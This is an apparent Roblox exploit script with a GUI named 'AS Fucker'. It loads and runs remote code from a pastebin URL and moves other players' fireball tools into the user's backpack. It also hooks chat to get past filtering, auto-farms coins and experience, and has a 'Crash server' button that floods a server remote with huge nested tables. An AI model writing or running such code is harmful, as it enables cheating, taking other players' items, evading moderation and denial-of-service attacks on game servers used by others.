local UserInputService = game:GetService("UserInputService")
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local isTped = false

char.Humanoid.Died:Connect(function()
    char = player.CharacterAdded:Wait(2)
    task.wait(3)
    isTped = false
end)

char.ChildAdded:Connect(function(child)
    if child.Name == "justFound" or child.Name == "Deb" or child.Name == "FireballDeb" then
        task.wait()
        child:Destroy()
    end
end)

local material = loadstring(game:HttpGet("https://pastebin.com/raw/AT1Tj9V8"))()
local window = material.Load({
    Title = "AS Fucker V0.1",
    Style = 3,
    Theme = "Dark",
    SizeX = 500,
    SizeY = 350
})

local character = window.New({
    Title = "Troll"
})

local radio = window.New({
    Title = "Radio"
})


local grind = window.New({
    Title = "Grinding"
})

local danger = window.New({
    Title = "Danger"
})

local walkspeed = character.Slider({
    Text = "Walkspeed",
    Callback = function(val)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = val
    end,
    Min = 16,
    Max = 200,
    Def = 16,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "It will increase your walking ability, dont sprint if its on."
            })
        end
    }
})

local jumppower = character.Slider({
    Text = "Jumppower",
    Callback = function(val)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = val
    end,
    Min = 55,
    Max = 600,
    Def = 55,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "It will increase your jumping ability."
            })
        end
    }
})

local players = {}
game.Players.PlayerAdded:Connect(function(plr)
    table.insert(players, plr.Name)
end)
game.Players.PlayerRemoving:Connect(function(plr)
    if table.find(players, plr.Name) then
        table.remove(players, table.find(players, plr.Name))
    end
end)
for i, v in pairs(game.Players:GetPlayers()) do
    if v ~= game.Players.LocalPlayer then
        table.insert(players, v.Name)
    end
end

local teleport = character.Dropdown({
    Text = "Teleport To",
    Callback = function(Value)
        if not game.Players:FindFirstChild(Value) then
            window.Banner({
                Text = "Player is not in game"
            })
        end
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
            game.Players[Value].Character.HumanoidRootPart.CFrame
    end,
    Options = players,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "Teleport to a player"
            })
        end
    }
})

local freefireball = character.Button({
    Text = "Free Fireball",
    Callback = function()
        if #game.Players:GetPlayers() <= 1 then
            window.Banner({
                Text = "This is not a filled server, so you cant use it here."
            })
        end
        local fireballsPlayers = {}
        for i, v in pairs(game.Players:GetPlayers()) do
            if v.Backpack:FindFirstChild("Fireball") or v.Character:FindFirstChild("Fireball") or
                v.Backpack:FindFirstChild("LightningBall") or v.Character:FindFirstChild("LightningBall") then
                local ball = v.Backpack:FindFirstChild("Fireball") or v.Character:FindFirstChild("Fireball") or
                                 v.Backpack:FindFirstChild("LightningBall") or
                                 v.Character:FindFirstChild("LightningBall")
                ball.Parent = game.Players.LocalPlayer.Backpack
            end
        end
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "No need of gamepass, make sure to use this in a filled server."
            })
        end
    }
})

local besmall = character.Button({
    Text = "Be Small",
    Callback = function()
        local event = game.ReplicatedStorage.AvatarEditor.RemoteEvent
        event:FireServer("scale", "HeightScale", 0.9)
        event:FireServer("scale", "WidthScale", 0.7)
        event:FireServer("scale", "HeadScale", 0.95)
        event:FireServer("scale", "ProportionScale", 0)
        event:FireServer("scale", "BodyTypeScale", 0)
        local LocalPlayer = game:GetService("Players").LocalPlayer
        local Character = LocalPlayer.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")

        local function rm()
            for i, v in pairs(Character:GetDescendants()) do
                if v:IsA("BasePart") then
                    if v.Name ~= "Head" then
                        for i, cav in pairs(v:GetDescendants()) do
                            if cav:IsA("Attachment") then
                                if cav:FindFirstChild("OriginalPosition") then
                                    cav.OriginalPosition:Destroy()
                                end
                            end
                        end
                        v:FindFirstChild("OriginalSize"):Destroy()
                        if v:FindFirstChild("AvatarPartScaleType") then
                            v:FindFirstChild("AvatarPartScaleType"):Destroy()
                        end
                    end
                end
            end
        end

        rm()
        task.wait(0.5)
        Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
        task.wait(1)

        rm()
        task.wait(0.5)
        Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
        task.wait(1)

        rm()
        task.wait(0.5)
        Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
        task.wait(1)

        rm()
        task.wait(0.5)
        Humanoid:FindFirstChild("HeadScale"):Destroy()
        task.wait(1)
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "Be small af."
            })
        end
    }
})

local bebig = character.Button({
    Text = "Be Big",
    Callback = function()
        local event = game.ReplicatedStorage.AvatarEditor.RemoteEvent
        event:FireServer("scale", "HeightScale", 1.05)
        event:FireServer("scale", "WidthScale", 1)
        event:FireServer("scale", "HeadScale", 1)
        event:FireServer("scale", "ProportionScale", 1)
        event:FireServer("scale", "BodyTypeScale", 1)
        local size = 5

        local LocalPlayer = game:GetService("Players").LocalPlayer
        local Character = LocalPlayer.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")

        local function rm()

            for i, v in pairs(Character:GetDescendants()) do
                if v:IsA("BasePart") then
                    if v.Name == "Handle" or v.Name == "Head" then
                        if Character.Head:FindFirstChild("OriginalSize") then
                            Character.Head.OriginalSize:Destroy()
                        end
                    else
                        for i, cav in pairs(v:GetDescendants()) do
                            if cav:IsA("Attachment") then
                                if cav:FindFirstChild("OriginalPosition") then
                                    cav.OriginalPosition:Destroy()
                                end
                            end
                        end
                        v:FindFirstChild("OriginalSize"):Destroy()
                        if v:FindFirstChild("AvatarPartScaleType") then
                            v:FindFirstChild("AvatarPartScaleType"):Destroy()
                        end
                    end
                end
            end
        end

        if size == 5 then
            rm()
            task.wait(0.5)
            Humanoid:FindFirstChild("BodyProportionScale"):Destroy()
            task.wait(1)

            rm()
            task.wait(0.5)
            Humanoid:FindFirstChild("BodyHeightScale"):Destroy()
            task.wait(1)

            rm()
            task.wait(0.5)
            Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
            task.wait(1)

            rm()
            task.wait(0.5)
            Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
            task.wait(1)

            rm()
            task.wait(0.5)
            Humanoid:FindFirstChild("HeadScale"):Destroy()
            task.wait(1)
        end
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "Be big af."
            })
        end
    }
})

local bebig = character.Button({
    Text = "Reset",
    Callback = function()
        game.Players.LocalPlayer.Character.Humanoid.Health = 0
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "Reset character ig."
            })
        end
    }
})

local loopchangeName = false

local loopchange = character.Toggle({
    Text = "Loop Change Name",
    Callback = function(val)
        loopchangeName = val
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "Changes your name every second lol"
            })
        end
    }
})

local chatbypass = character.Toggle({
    Text = "Chat Bypass",
    Callback = function(val)
        local function a()
            return {["A"]="🇦",["B"]="🇧",["C"]="🇨",["D"]="🇩",["E"]="🇪",["F"]="🇫",["G"]="🇬",["H"]="🇭",["I"]="🇮",["J"]="🇯",["K"]="🇰",["L"]="🇱",["M"]="🇲",["N"]="🇳",["O"]="🇴",["P"]="🇵",["Q"]="🇶",["R"]="🇷",["S"]="🇸",["T"]="🇹",["U"]="🇺",["V"]="🇻",["W"]="🇼",["X"]="🇽",["Y"]="🇾",["Z"]="🇿"} 
        end
        local Alphabet, old = a()
        old = hookmetamethod(game,"__namecall",function(self,...)
            if getnamecallmethod() == "FireServer" and tostring(self) == "SayMessageRequest" then
                if val then
                    local Arguments = {...}
                    local Word = {}
                    for Letters in string.gmatch(Arguments[1],".") do
                        table.insert(Word, Alphabet[Letters:upper()])
                    end
                    Arguments[1] = table.concat(Word,"او")
                    return old(self, unpack(Arguments))
                else
                    local Arguments = {...}
                    return old(self, unpack(Arguments))
                end
            end
            return old(self, ...)
        end)
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "Use on an alt, high chances of getting banned."
            })
        end
    }
})

local afkEnabled = false
local coinFarmEnabled = false
local dummy = false
local hiddendummy = false
local vu = game:GetService("VirtualUser")

game.Players.LocalPlayer.Idled:Connect(function()
    if afkEnabled then
        vu:CaptureController()
        vu:ClickButton2(Vector2.new())
    end
end)

local antiafk = grind.Toggle({
    Text = "Anti-Afk",
    Callback = function(val)
        afkEnabled = val
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "No more afk kicks!"
            })
        end
    }
})

local coinFarm = grind.Toggle({
    Text = "Coin Farm",
    Callback = function(val)
        coinFarmEnabled = val
        if val == false then
            isTped = false
        end
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "200k+ exp if you are below level 20k."
            })
        end
    }
})

local dummyfarm = grind.Toggle({
    Text = "Dummy Farm",
    Callback = function(val)
        dummy = val
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "Default farm at traning area."
            })
        end
    }
})

local powerdummyfarm = grind.Toggle({
    Text = "5k Dummy Farm",
    Callback = function(val)
        hiddendummy = val
        if val == false then
            isTped = false
        end
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "5k+ Dummy farm area"
            })
        end
    }
})

local fireballspam = danger.Toggle({
    Text = "Multi-Shot Fireball",
    Callback = function(val)
       if val then
        local char = player.Character
        local fireball = (player.Backpack:FindFirstChild("Fireball") or player.Backpack:FindFirstChild("Lightningball")) or (char:FindFirstChild("Fireball") or char:FindFirstChild("Lightningball"))
        fireball.Activated:Connect(function()
            local mouse = player:GetMouse()
            local pos = mouse.Hit.Position
            for i,v in pairs(game.Players:GetPlayers()) do
                local char = v.Character
                local fireball = (v.Backpack:FindFirstChild("Fireball") or v.Backpack:FindFirstChild("Lightningball")) or (char:FindFirstChild("Fireball") or char:FindFirstChild("Lightningball"))
                if fireball then
                    print(v.Name,fireball)
                    local event = fireball:FindFirstChild("FireballEvent")
                    print(pos)
                    event:FireServer(pos)
                end
            end
        end)
       end
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "Your fireball gonna shoot multiple times! must be in filled server."
            })
        end
    }
})

local crash = danger.Button({
    Text = "Crash server",
    Callback = function()
        window.Banner({
            Text = "Dont use the ui now, just wait and watch for the server to crash!"
        })
        while task.wait(0.6) do --// don't change it's the best
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
            local function getmaxvalue(val)
               local mainvalueifonetable = 499999
               if type(val) ~= "number" then
                   return nil
               end
               local calculateperfectval = (mainvalueifonetable/(val+2))
               return calculateperfectval
            end
            
            local function bomb(tableincrease, tries)
            local maintable = {}
            local spammedtable = {}
            
            table.insert(spammedtable, {})
            z = spammedtable[1]
            
            for i = 1, tableincrease do
                local tableins = {}
                table.insert(z, tableins)
                z = tableins
            end
            
            local calculatemax = getmaxvalue(tableincrease)
            local maximum
            
            if calculatemax then
                 maximum = calculatemax
                 else
                 maximum = 999999
            end
            
            for i = 1, maximum do
                 table.insert(maintable, spammedtable)
            end
            
            for i = 1, tries do
                 game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
            end
            end
            
            bomb(250, 2) --// change values if client crashes
            end
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "You fr gonna do that?"
            })
        end
    }
})

local soundId = 0
local soundField = radio.TextField({
    Text = "Sound Id",
    Callback = function(val)
        if val and tonumber(val) then
            soundId = tonumber(val)
        end
    end
})

local playsound = radio.Button({
    Text = "Play Sound",
    Callback = function()
        if soundId == 0 then
            return
        end
        
        game:GetService("Workspace"):FindFirstChild("DRadio_Script").Event:FireServer(soundId)
    end
})

local stopsound = radio.Button({
    Text = "Stop Sound",
    Callback = function()
        game:GetService("Workspace"):FindFirstChild("DRadio_Script").Event:FireServer(0)
    end
})

local music = radio.Button({
    Text = "Get Playing Music Ids",
    Callback = function()
        if #game.Players:GetPlayers() <= 0 then
            window.Banner({
                Text = "This is not a filled server, so you cant use it here."
            })
        end
        local playing = ""
        for i, v in pairs(game.Players:GetPlayers()) do
            if v.Character.HumanoidRootPart:FindFirstChild("Sound") then
                local yes, no = pcall(function()
                    local id = string.gsub(tostring(v.Character.HumanoidRootPart.Sound.SoundId),"rbxassetid://","")
                    playing = playing .. ' ' .. v.Name .. ' is playing ' .. '' .. id .. '\n'
                end)
                if not yes then
                    print(no)
                end
            end
        end
        window.Banner({
            Text = playing
        })
    end,
    Menu = {
        Information = function(self)
            window.Banner({
                Text = "Shows all the playing ids."
            })
        end
    }
})

if syn then
    if (isfolder('AS Fucker')) then
    else
        makefolder('AS Fucker')
        makefolder('AS Fucker/Music Ids')
        makefolder('AS Fucker/Settings')
        writefile('AS Fucker/README.txt','Thanks for using AS fucker! you can join our discord from here:\ndiscord.gg/s8xsH8wXSk')
    end
    local savemusic = radio.Button({
        Text = "Save current music to folder",
        Callback = function()
            if not isfolder('AS Fucker') then return end
            if #game.Players:GetPlayers() <= 0 then
                window.Banner({
                    Text = "This is not a filled server, so you cant use it here."
                })
            end
            local playing = ""
            for i, v in pairs(game.Players:GetPlayers()) do
                if v.Character.HumanoidRootPart:FindFirstChild("Sound") then
                    local yes, no = pcall(function()
                        local id = string.gsub(tostring(v.Character.HumanoidRootPart.Sound.SoundId),"rbxassetid://","")
                        local Asset = game:GetService("MarketplaceService"):GetProductInfo(id)
                        local assetName = (Asset and (Asset.Name and Asset.Name or "idk") or "idk")
                        playing = playing .. ' '.. assetName .. ' - ' .. tostring(id) .. '\n'
                    end)
                    if not yes then
                        print(no)
                    end
                end
            end
            local valid = isfile("AS Fucker/Music Ids/file.txt")
            if not valid then
                writefile("AS Fucker/Music Ids/file.txt", playing)
            else
                appendfile("AS Fucker/Music Ids/file.txt", playing)
            end
            loadfile("AS Fucker/Music Ids/file.txt") 
            window.Banner({
                Text = 'Done! the file saved at\nSynapse/Workspace/AS Fucker/Music Ids/file.txt'
            })
        end,
        Menu = {
            Information = function(self)
                window.Banner({
                    Text = "Music Text File location:\n Synapse/Workspace/AS Fucker/Music Ids/file.txt"
                })
            end
        }
    })
end

task.spawn(function()
    local function generate()
        local min, max, final = ("a"):byte(), ("z"):byte(), ""
        for i = 1, math.random(1,5) do
          final ..= string.char(math.random(min, max))
        end
        return final
    end
    while task.wait(.7) do
        if loopchangeName then
            local name = generate()
            local evt = game.Players.LocalPlayer.PlayerGui.RolePlayName.Frame.bodyFrame.submitBtn.nameEvent
            evt:FireServer(name)
        end
    end
end)

task.spawn(function()
    while task.wait() do
        if coinFarmEnabled then
            local event = game.ReplicatedStorage.Events.CoinEvent
            event:FireServer()  
        end
    end
end)

task.spawn(function()
    local a,b = pcall(function()
        while task.wait() do
            local td
            if dummy then
                td = game:GetService("Workspace").MAP.dummies:FindFirstChild("Training Dummy")
            elseif hiddendummy then
                td = game:GetService("Workspace").MAP["5k_dummies"]:FindFirstChild("Dummy2")
            else
                td = false
            end
            if td then
                local player = game.Players.LocalPlayer
                local char = player.Character or player.CharacterAdded:Wait()
                if char:WaitForChild("Humanoid").Health < 0 then
                    isTped = false
                end
                if isTped == false then
                    local root = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart")
                    root.CFrame = td.HumanoidRootPart.CFrame + Vector3.new(-3,0,0)
                    isTped = true
                end
                game:GetService("ReplicatedStorage").jdskhfsIIIllliiIIIdchgdIiIIIlIlIli:FireServer(td.Humanoid, 1)
    
                local balls = {"Fireball","LightningBall"}
                local locations = {"Backpack", "Character"}
    
                for i, player in pairs(game.Players:GetChildren()) do
                    for _,Ball in pairs(balls) do
                        local CheckBall = (player.Backpack:FindFirstChild(Ball)) or (player.Character and player.Character:FindFirstChild(Ball))
                            if CheckBall then
                                local event = CheckBall:FindFirstChild("FireballEvent") or CheckBall:WaitForChild("FireballEvent")
                                event:FireServer(td.HumanoidRootPart.Position)
                                task.wait()
                            end
                    end
                end
    
            end
        end   
    end)
    if not a then
        error(b)
    end
end)
